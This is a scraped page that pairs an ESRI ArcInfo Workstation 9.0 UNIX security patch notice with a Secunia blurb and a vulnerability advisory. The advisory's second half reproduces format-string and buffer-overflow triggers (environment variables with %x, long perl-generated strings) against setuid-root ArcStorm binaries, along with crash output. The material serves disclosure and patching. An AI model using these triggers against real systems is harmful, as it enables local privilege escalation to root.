### Summary

This Patch addresses possible security vulnerabilities in the ArcStorm and Geoprocessing Server features of ArcInfo Workstation 9.0 on UNIX.

### Description

ESRIÂ® announces the ArcInfo Workstation 9.0 Security Patch on UNIX. This Patch addresses possible security vulnerabilities in the ArcStorm and Geoprocessing Server features of ArcInfo Workstation 9.0 on UNIX. It deals specifically with the issues listed below under [Issues Addressed with this Patch](#bugs).

 We recommend that all ArcInfo Workstation 9.0 on UNIX customers, who use ArcStorm or the Geoprocessing Server feature, download and install this Patch at their earliest convenience to ensure the highest quality experience when working with ArcInfo Workstation 9.0. ArcInfo users who do not use ArcStorm or the Geoprocessing Server do not need to apply this patch. For those users, however, we strongly recommend that the ownership of the files in $ARCHOME/bin be reviewed and any root-owned executables be switched back to the ownership of the normal ArcInfo install account. If ArcStorm and the Geoprocessing Server are not in use, there should be no root-owned executables in the $ARCHOME/bin directory.

### Issues Addressed with this Patch

* CQ00291050 - Possible vulnerabilities found in ArcInfo Workstation binaries when using ArcStorm or the Geoprocessing Server features.

### Files Installed in this Patch

* Under the ArcInfo Workstation 9.0 installation bin directory:
  + abservice
     asbuild
     asmaster
     asrecovery
     asuser
     asutility
     lockmgr
     se
     wservice

### Installing this Patch

This Patch is intended for ArcInfo users who run ArcStorm or the Geoprocessing Server feature. The installation of those features require that selected ArcInfo executables be assigned root ownership. This Patch provides new versions of those root-owned files.

ArcInfo Workstation 9.0 must be installed before you can install this Patch. During installation, you can either save the original 9.0 files or overwrite them. If you choose to save them, make sure you have enough disk space. The disk space requirements, for each platform, are displayed during the installation process.

1. Make sure you have write access to the ArcInfo Workstation installation location, and that no one is using ArcInfo.
2. Download the appropriate tar file to a location other than ArcInfoWorkstation installation location:
3. | **File** **Updated Tar Files as of June 9, 2006** | **Size** |
   | --- | --- |
   | HP [ai90-sec-patch-hp.tar](https://downloads.esri.com/Support/downloads/ao_/ai90-sec-patch-hp.tar) | 35 MB |
   | IBM [ai90-sec-patch-ibm.tar](https://downloads.esri.com/Support/downloads/ao_/ai90-sec-patch-ibm.tar) | 14 MB |
   | SGI [ai90-sec-patch-sgi.tar](https://downloads.esri.com/Support/downloads/ao_/ai90-sec-patch-sgi.tar) | 21 MB |
   | Solaris [ai90-sec-patch-solaris.tar](https://downloads.esri.com/Support/downloads/ao_/ai90-sec-patch-solaris.tar) | 18 MB |
   | Tru64 [ai90-sec-patch-tru64.tar](https://downloads.esri.com/Support/downloads/ao_/ai90-sec-patch-tru64.tar) | 31 MB |
4. Extract the specified tar file by typing:

   `% tar -xvf ai90-sec-patch-<Platform>.tar`
5. Start the installation by typing:

   `% ./applypatch`

   This will start the dialog for the menu-driven installation procedure. Default selections are noted in parentheses ( ). To quit the installation procedure, type 'q' at any time.
6. Under the $ARCHOME/bin directory, become ROOT and change the ownership and permissions of the following ArcStorm executables:

   `#chown root abservice asbuild asmaster asrecovery asuser asutility lockmgr se wservice
    #chmod 6755 abservice asbuild asmaster asrecovery asuser asutility lockmgr se wservice`
7. (Optional - Perform this step only if you chose to back up the original files when applying the patch.)

    Under the $ARCHOME/bin directory, become ROOT and change the ownership and permissions of the following files:

   `#chown <your_user_account_name> abservice.orig asbuild.orig asmaster.orig asrecovery.orig asuser.orig asutility.orig lockmgr.orig se.orig wservice.orig

    #chmod 444 abservice.orig asbuild.orig asmaster.orig asrecovery.orig asuser.orig asutility.orig lockmgr.orig se.orig wservice.orig`

### How to identify which Patch is installed

Any modified UNIX executables (or libraries) being sent out as part of a Patch will return the unique identification number for that fix when checked with the "what" command for UNIX and the "strings" command for Linux. For example, to display the identification string for this Patch, type:

* `%what se | grep QFE`

  `QFE-WS-90-CQ00291050`

### Patch Updates

Check the [Online Support Center](#EsriSupport/) periodically for the availability of additional Patches. New information about this Patch will be posted here.

* **UPDATE 06/09/2006 - Updated Tar Files to address two additional security vulnerabilities.**

### Getting Help

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the worldâs best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoftâs Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that arenât normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

ESRI ArcGIS is an integrated collection of GIS software products for building a complete GIS.
ArcGIS enables users to deploy GIS functionality wherever it is needed in desktops, servers, or
custom applications; over the Web; or in the field.

Several local overflows and format string conditions have been found in the Unix versions of ESRI
ArcGIS products. ESRI Staff has promptly responded to and fixed the issues mentioned below. Patches
for ArcGIS 9.x will be available at the time this advisory is published.

(<http://support.esri.com/index.cfm?fa=downloads.patchesServicePacks.viewPatch&PID=14&MetaID=1015>)

Our testing was performed against ARCInfo Workstation 9 on two of ESRI's supported UNIX platforms.
We have currently only tested IRIX 6.5 and Solaris 10(beta). All UNIX ArcInfo installs are believed
to be impacted by these vulnerabilities. It is currently unknown how older versions of ArcGIS are
affected by these bugs. ESRI has stated that fixes for 8.x are forthcomming so I can only assume
exploitation is similar for this particlar version.

The vulnerable binaries can be found in <install path>/bin. The files are both setuid and setgid so
they should be easily found during a routine setuid scan using the unix find utility. I was not able to
exploit ALL of the binaries I found  however it is likely that more vulns could be discovered.

10 setuid root binaries are provided with the install of ARCInfo

For some reason the binaries are setgid (9). On our SunOS and IRIX boxes
this group corresponed respectively with nuucp and lp.

Some of the vulnerabilities will require a properly working license and license manager
-bash-2.05b# export LM_LICENSE_FILE=/export/home/arcgis/arcexe9x/sysgen/license.dat
-bash-2.05b# ps -ef | grep lmgr | grep -v grep
    root  1294     1   0 18:14:44 pts/3       0:00 ./lmgrd -c ./license.dat

during exploitation you may see license requests mixed in with the applciation responses.

18:27:29 (ARCGIS) OUT: "ArcStormEnable" kf@ims0

A cursory audit of the above listed applications revealed the following
flaws.

Both lockmgr and wservice are vulnerable to a format string attack.

-bash-2.05b$ export
ARCHOME=AAAABBBB%x.%x.%x.%x

-bash-2.05b$ ./wservice
Can not find or access
AAAABBBB7ffffc00.2a078.9e39c.241 - wservice not run!

-bash-2.05b# export ARCHOME=%x.%x.%x.%x
-bash-2.05b# ./lockmgr
Can not find or access 7ffffc00.2a15c.9e39c.36 - lockmgr not run!

asmaster is vulnerable to a buffer overflow attack

-bash-2.05b#  ./asmaster `perl -e 'print "A" x 2285'` b
FATAL ERROR
Segment Violation

-bash-2.05b# ./asuser `perl -e 'print "A" x 694'` a a a
FATAL ERROR
Segment Violation

asutility has multiple overflows

-bash-2.05b# ./asutility DBDEF REMOVE `perl -e 'print "A" x 701'`
FATAL ERROR
Segment Violation

-bash-2.05b# ./asutility RMDB `perl -e 'print "A" x 1865'`
FATAL ERROR
Segment Violation

-bash-2.05b# ./asutility CHECKDBIDS AVAILABLE `perl -e 'print "A" x
804'`
FATAL ERROR
Segment Violation

please note that asutility has several other overflows. Listing them all is a
bit redundant.

se is subject to a buffer overflow

-bash-2.05b# ../bin/se `perl -e 'print "A" x 1278'`
FATAL ERROR
Segment Violation

asrecovery is subject to a buffer overflow

-bash-2.05b# ./asrecovery  `perl -e 'print "A" x 1987'` a a a
FATAL ERROR
Segment Violation

In order to show that these issues do indeed pose a security risk we have created PoC for the
format string conditions in wservice and lockmgr. This exploit was tested on the solaris platform
however exploitation on other platforms should be trivial.
